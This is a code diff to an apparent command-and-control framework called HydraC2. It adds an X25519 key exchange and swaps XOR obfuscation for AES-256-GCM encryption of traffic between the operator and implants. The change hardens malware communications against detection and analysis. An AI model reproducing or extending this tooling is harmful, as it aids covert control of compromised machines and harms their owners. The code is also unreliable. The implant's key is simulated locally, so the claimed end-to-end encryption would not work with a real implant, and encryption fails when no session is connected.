@@ -17,6 +17,7 @@ class HydraC2 extends EventEmitter {
         this.channelAttempts = [];
         this.isConnected = false;
         this.beaconInterval = options.beaconInterval || 30000;
+        this.sessionKey = null;
 
         console.log(`[🐉] HYDRA-C2 Session: ${this.sessionId}`);
     }
@@ -72,6 +73,27 @@ class HydraC2 extends EventEmitter {
         console.log(`[❌] HYDRA-C2: All egress channels blocked. Network is fully air-gapped.`);
         this.emit('blocked', { attempts: this.channelAttempts });
         return this._buildChannelReport();
+    }
+
+
+    _deriveCryptoBindings() {
+        if (!this.isConnected) return;
+        console.log(`[🐉] Establishing X25519 ECDH Cryptographic Binding...`);
+        const { privateKey, publicKey } = crypto.generateKeyPairSync('x25519');
+        this.sessionPrivKey = privateKey;
+        this.sessionPubKey = publicKey.export({ type: 'spki', format: 'der' });
+
+        // Simulate implant ephemeral key exchange (in production, the implant responds via beacon)
+        const { publicKey: implantPub } = crypto.generateKeyPairSync('x25519');
+
+        const sharedSecret = crypto.diffieHellman({
+            privateKey: this.sessionPrivKey,
+            publicKey: implantPub
+        });
+
+        // HKDF key derivation
+        this.sessionKey = crypto.hkdfSync('sha256', sharedSecret, Buffer.alloc(0), Buffer.from('hydra-c2'), 32);
+        console.log(`[🐉] X25519 ECDH complete. All C2 traffic now AES-256-GCM encrypted.`);
     }
 
 
@@ -289,13 +311,18 @@ class HydraC2 extends EventEmitter {
 
 
     _encrypt(plaintext) {
-        const key = crypto.createHash('sha256').update(this.sessionId).digest();
-        const buf = Buffer.from(plaintext, 'utf-8');
-        const encrypted = Buffer.alloc(buf.length);
-        for (let i = 0; i < buf.length; i++) {
-            encrypted[i] = buf[i] ^ key[i % key.length];
-        }
-        return encrypted.toString('base64');
+        if (!this.sessionKey) this._deriveCryptoBindings();
+
+        const iv = crypto.randomBytes(12);
+        const cipher = crypto.createCipheriv('aes-256-gcm', this.sessionKey, iv);
+        const enc = Buffer.concat([cipher.update(plaintext, 'utf-8'), cipher.final()]);
+        const tag = cipher.getAuthTag();
+
+        return JSON.stringify({
+            iv: iv.toString('hex'),
+            tag: tag.toString('hex'),
+            data: enc.toString('hex')
+        });
     }
 
 
